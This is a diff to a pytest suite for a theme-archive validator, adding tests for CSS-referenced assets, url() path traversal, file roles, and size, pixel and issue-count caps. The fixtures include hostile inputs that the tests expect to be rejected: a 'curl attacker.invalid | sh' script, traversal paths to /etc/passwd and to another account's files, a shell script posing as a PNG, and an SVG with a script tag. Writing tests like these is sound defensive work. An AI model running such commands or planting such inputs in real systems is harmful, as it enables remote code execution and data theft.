@@ -1,6 +1,10 @@
 import hashlib
 import json
+import logging
+import os
+import struct
 import zipfile
+import zlib
 
 import pytest
 
@@ -76,15 +80,6 @@ def test_an_asset_is_typed_by_content_not_extension(tmp_path):
     with pytest.raises(ThemeRejected) as e:
         validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/shell.png": "#!/bin/sh\n"}, manifest))
     assert any(i.code == "bad_asset_type" for i in e.value.issues)
-
-
-def test_a_preview_over_the_pixel_cap_is_rejected(tmp_path, monkeypatch):
-    from themes import limits
-    monkeypatch.setattr(limits, "MAX_PREVIEW_EDGE_PX", 0)
-    manifest = {**MANIFEST, "preview": [{"src": "images/p.png"}]}
-    with pytest.raises(ThemeRejected) as e:
-        validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/p.png": PNG_1x1}, manifest))
-    assert any(i.code == "preview_too_large" for i in e.value.issues)
 
 
 def test_a_valid_preview_is_kept(tmp_path):
@@ -214,8 +209,11 @@ def test_deeply_nested_css_is_rejected_not_recursion_error(tmp_path):
     # Build a CSS function nesting that triggers RecursionError in tinycss2.
     # 500 levels of calc() exceeds the parser's stack depth without hitting
     # the archive expansion_ratio check (which happens around 1000 levels).
+    # The token is a settable one, so the only thing wrong with this stylesheet
+    # is its depth; an unknown token name would be rejected before the parser
+    # ever got deep enough to run out of stack.
     nested = "calc(" * 500 + "1" + ")" * 500
-    css = f":root {{ --deep: {nested}; }}"
+    css = f":root {{ --accent: {nested}; }}"
 
     with pytest.raises(ThemeRejected) as e:
         validate_archive(build(tmp_path, {"css/tokens.css": css}))
@@ -301,6 +299,9 @@ def test_deeply_nested_json_manifest_with_smaller_depth_also_rejected(tmp_path):
     """Deeply nested JSON is rejected regardless of depth.
 
     Test with a smaller depth to ensure the guard works across different sizes.
+    At this depth json.loads succeeds, so the rejection comes from the shape
+    check rather than from the recursion guard — and the author is told which,
+    rather than being told their JSON was unparseable when it parsed fine.
     """
     # Build a manifest with ~2,000 levels of nested arrays.
     nested_json = "[" * 2000 + '{"schema": 1}' + "]" * 2000
@@ -312,8 +313,22 @@ def test_deeply_nested_json_manifest_with_smaller_depth_also_rejected(tmp_path):
     with pytest.raises(ThemeRejected) as e:
         validate_archive(path)
 
-    # Must be caught as bad_manifest.
-    assert any(i.code == "bad_manifest" for i in e.value.issues)
+    codes = {i.code for i in e.value.issues}
+    assert codes <= {"bad_json", "bad_manifest"} and codes
+    assert "validator_error" not in codes
+
+
+def test_a_manifest_rejection_keeps_its_own_code_and_message(tmp_path):
+    """A manifest that parses but fails a rule says which rule.
+
+    The outer guard around parse_manifest used to convert every finding into
+    "theme.json could not be parsed as valid JSON", so an author with a bad
+    accent colour was told their JSON was broken.
+    """
+    manifest = {**MANIFEST, "brand": {"name": "Demo", "accent": "not-a-colour"}}
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {"css/tokens.css": ":root{}"}, manifest))
+    assert any(i.code == "bad_accent" for i in e.value.issues)
 
 
 def test_validator_outer_net_catches_unexpected_exception(tmp_path, monkeypatch):
@@ -359,3 +374,260 @@ def test_genuine_theme_rejected_is_not_swallowed_by_outer_net(tmp_path):
     codes = {i.code for i in e.value.issues}
     assert "refused_property" in codes
     assert "validator_error" not in codes
+
+
+# --- I3: a CSS-referenced image is part of the theme ------------------------
+
+
+def test_an_image_referenced_only_by_css_is_written(tmp_path):
+    """The finding's own archive.
+
+    Before this, the file validated as ACCEPTED with the image reported as
+    "ignored" — the theme was written 404-ing its own background, and the
+    author's only signal was one line in a list of stray files.
+    """
+    result = validate_archive(build(tmp_path, {
+        "css/web.css": "[data-pd-btn]{ background-image: url(../images/bg.png) }",
+        "images/bg.png": PNG_1x1,
+    }))
+    assert "images/bg.png" in result.files
+    assert "images/bg.png" not in result.ignored
+
+
+def test_a_css_url_pointing_at_nothing_is_a_missing_asset(tmp_path):
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {
+            "css/web.css": "[data-pd-btn]{ background-image: url(../images/gone.png) }",
+        }))
+    issue = next(i for i in e.value.issues if i.code == "missing_asset")
+    assert issue.file == "images/gone.png"
+
+
+def test_a_css_referenced_file_still_has_to_be_an_asset(tmp_path):
+    """The write set grew a new entrance, so the type check has to cover it.
+
+    Without this, url(../install.sh) would copy a shell script into the served
+    theme directory.
+    """
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {
+            "css/web.css": "[data-pd-btn]{ background-image: url(../install.sh) }",
+            "install.sh": "curl attacker.invalid | sh",
+        }))
+    assert any(i.code == "bad_asset_type" for i in e.value.issues)
+
+
+def test_a_css_referenced_svg_is_sanitized_before_it_is_written(tmp_path):
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {
+            "css/web.css": "[data-pd-btn]{ background-image: url(../images/x.svg) }",
+            "images/x.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>',
+        }))
+    assert any(i.code == "svg_script" for i in e.value.issues)
+
+
+def test_a_font_referenced_by_font_face_is_written(tmp_path):
+    result = validate_archive(build(tmp_path, {
+        "css/web.css": "@font-face{ font-family:'Inter'; src:url(../fonts/inter.woff2) format('woff2') }",
+        "fonts/inter.woff2": b"wOF2" + b"\x00" * 40,
+    }))
+    assert "fonts/inter.woff2" in result.files
+
+
+# --- I2: url() traversal ----------------------------------------------------
+
+
+def test_a_url_escaping_the_archive_is_rejected(tmp_path):
+    for hostile in (
+        "url(../../../../etc/passwd)",
+        'url("../../other-account/theme/css/tokens.css")',
+    ):
+        with pytest.raises(ThemeRejected) as e:
+            validate_archive(build(tmp_path, {
+                "css/web.css": f"[data-pd-btn]{{ background-image: {hostile} }}",
+            }))
+        assert any(i.code == "external_url" for i in e.value.issues), hostile
+
+
+# --- I5: a file is judged by its role before its structural set -------------
+
+
+def test_a_preview_may_not_be_a_stylesheet(tmp_path):
+    manifest = {**MANIFEST, "preview": [{"src": "css/tokens.css"}]}
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {"css/tokens.css": ":root{}"}, manifest))
+    issue = next(i for i in e.value.issues if i.code == "bad_manifest")
+    assert "a stylesheet" in issue.message
+
+
+def test_a_logo_may_not_be_a_stylesheet_or_a_font_or_the_manifest(tmp_path):
+    for reference, role in (
+        ("css/tokens.css", "a stylesheet"),
+        ("fonts/x.woff2", "a font"),
+        ("theme.json", "the manifest"),
+    ):
+        manifest = {**MANIFEST, "logo": reference}
+        with pytest.raises(ThemeRejected) as e:
+            validate_archive(build(tmp_path, {
+                "css/tokens.css": ":root{}",
+                "fonts/x.woff2": b"wOF2" + b"\x00" * 40,
+            }, manifest))
+        issue = next(i for i in e.value.issues if i.code == "bad_manifest")
+        assert role in issue.message, reference
+
+
+def test_structural_role_is_decided_by_the_format_not_by_a_list():
+    from themes.validate import structural_role
+    assert structural_role("theme.json") == "the manifest"
+    assert structural_role("css/desktop.css") == "a stylesheet"
+    assert structural_role("fonts/anything/at/all.woff2") == "a font"
+    assert structural_role("images/logo.svg") is None
+
+
+# --- I6: validation cost is bounded -----------------------------------------
+
+
+def test_a_stylesheet_over_the_byte_cap_is_never_parsed(tmp_path, monkeypatch):
+    """MAX_CSS_BYTES, checked before tinycss2 sees the bytes.
+
+    19.5 MB of CSS under every other cap took 207 s and 870 MB of heap to
+    reject. Patching the parser to explode proves the cap is applied first.
+    """
+    from themes import cssfilter, limits
+    monkeypatch.setattr(limits, "MAX_CSS_BYTES", 100)
+
+    def explode(*args, **kwargs):
+        raise AssertionError("the stylesheet was parsed before its size was checked")
+
+    monkeypatch.setattr(cssfilter.tinycss2, "parse_stylesheet", explode)
+
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {"css/tokens.css": ":root{ --accent: red; }" * 50}))
+    assert any(i.code == "css_too_large" for i in e.value.issues)
+
+
+def test_a_stylesheet_at_the_byte_cap_is_still_parsed(tmp_path, monkeypatch):
+    from themes import limits
+    body = ":root{ --accent: #22c5b0; }"
+    monkeypatch.setattr(limits, "MAX_CSS_BYTES", len(body))
+    result = validate_archive(build(tmp_path, {"css/tokens.css": body}))
+    assert "css/tokens.css" in result.files
+
+
+# --- I11: MAX_PREVIEW_BYTES had no test at all ------------------------------
+
+
+def test_a_preview_over_the_byte_cap_is_rejected(tmp_path):
+    """A genuinely oversized preview, not a patched cap.
+
+    The padding is random so it cannot compress, which would otherwise trip
+    the expansion-ratio check first and pass this test for the wrong reason.
+    """
+    from themes import limits
+    oversized = PNG_1x1 + os.urandom(limits.MAX_PREVIEW_BYTES)
+    assert len(oversized) > limits.MAX_PREVIEW_BYTES
+    manifest = {**MANIFEST, "preview": [{"src": "images/p.png"}]}
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/p.png": oversized}, manifest))
+    issue = next(i for i in e.value.issues if i.code == "preview_too_large")
+    assert "bytes" in issue.message
+
+
+def test_a_genuinely_oversized_preview_is_rejected_on_pixels(tmp_path):
+    """The pixel cap, with an image that is actually too big.
+
+    The previous test patched MAX_PREVIEW_EDGE_PX to 0 and fed a 1x1 PNG, which
+    holds for any nonzero dimensions and so proved nothing about the cap.
+    """
+    from themes import limits
+
+    edge = limits.MAX_PREVIEW_EDGE_PX + 1
+    ihdr = struct.pack(">II5B", edge, edge, 8, 6, 0, 0, 0)
+    chunk = struct.pack(">I", len(ihdr)) + b"IHDR" + ihdr + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
+    huge_header = b"\x89PNG\r\n\x1a\n" + chunk
+
+    manifest = {**MANIFEST, "preview": [{"src": "images/p.png"}]}
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/p.png": huge_header}, manifest))
+    issue = next(i for i in e.value.issues if i.code == "preview_too_large")
+    assert f"{edge}x{edge}" in issue.message
+
+
+def test_a_preview_at_exactly_the_pixel_cap_is_accepted(tmp_path):
+    from themes import limits
+
+    edge = limits.MAX_PREVIEW_EDGE_PX
+    ihdr = struct.pack(">II5B", edge, edge, 8, 6, 0, 0, 0)
+    chunk = struct.pack(">I", len(ihdr)) + b"IHDR" + ihdr + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
+    at_cap = b"\x89PNG\r\n\x1a\n" + chunk
+
+    manifest = {**MANIFEST, "preview": [{"src": "images/p.png"}]}
+    result = validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/p.png": at_cap}, manifest))
+    assert "images/p.png" in result.files
+
+
+# --- T8: the outer net names the file it was looking at ---------------------
+
+
+def test_the_outer_net_names_the_file_it_failed_on(tmp_path, monkeypatch):
+    from themes import validate
+
+    def probe_that_fails(*args, **kwargs):
+        raise MemoryError("simulated memory failure")
+
+    monkeypatch.setattr(validate, "probe", probe_that_fails)
+
+    manifest = {**MANIFEST, "logo": "images/test.svg"}
+    svg_data = b'<svg xmlns="http://www.w3.org/2000/svg"></svg>'
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/test.svg": svg_data}, manifest))
+
+    issue = next(i for i in e.value.issues if i.code == "validator_error")
+    # The loop variable was in scope all along; reporting file="" told an admin
+    # nothing about which entry to remove.
+    assert issue.file == "images/test.svg"
+
+
+def test_the_outer_net_logs_what_it_masked(tmp_path, monkeypatch, caplog):
+    """The masking trade-off has a seam, and the seam is exercised.
+
+    An unexpected exception becomes a user-facing validator_error rather than
+    failing loudly, which is right for the HTTP handler above and wrong for
+    finding our own bugs. The log line is the only thing that closes that gap.
+    """
+    from themes import validate
+
+    def probe_that_fails(*args, **kwargs):
+        raise AttributeError("a future refactor's mistake")
+
+    monkeypatch.setattr(validate, "probe", probe_that_fails)
+
+    manifest = {**MANIFEST, "logo": "images/test.svg"}
+    svg_data = b'<svg xmlns="http://www.w3.org/2000/svg"></svg>'
+    with caplog.at_level(logging.ERROR, logger="themes.validate"):
+        with pytest.raises(ThemeRejected):
+            validate_archive(build(tmp_path, {"css/tokens.css": ":root{}", "images/test.svg": svg_data}, manifest))
+
+    assert any("AttributeError" in r.exc_text for r in caplog.records if r.exc_text)
+
+
+def test_the_whole_report_is_bounded_not_just_each_stylesheet(tmp_path, monkeypatch):
+    """Four stylesheets, each already at the cap, must not add up to four caps.
+
+    Each filter_css call bounds its own list, then hands it to the validator to
+    merge; without a bound on the merge the aggregate is one cap per file, and
+    the archive that cost 870 MB of heap shipped its issues in one stylesheet
+    only because that was the easiest way to write it.
+    """
+    from themes import limits
+    monkeypatch.setattr(limits, "MAX_ISSUES", 10)
+
+    bad = "\n".join(f".sel{i} {{ color: red; }}" for i in range(200))
+    with pytest.raises(ThemeRejected) as e:
+        validate_archive(build(tmp_path, {name: bad for name in (
+            "css/tokens.css", "css/web.css", "css/appViewer.css", "css/desktop.css",
+        )}))
+
+    # The cap, plus at most one truncation note.
+    assert len(e.value.issues) <= limits.MAX_ISSUES + 1
+    assert any(i.code == "issues_truncated" for i in e.value.issues)
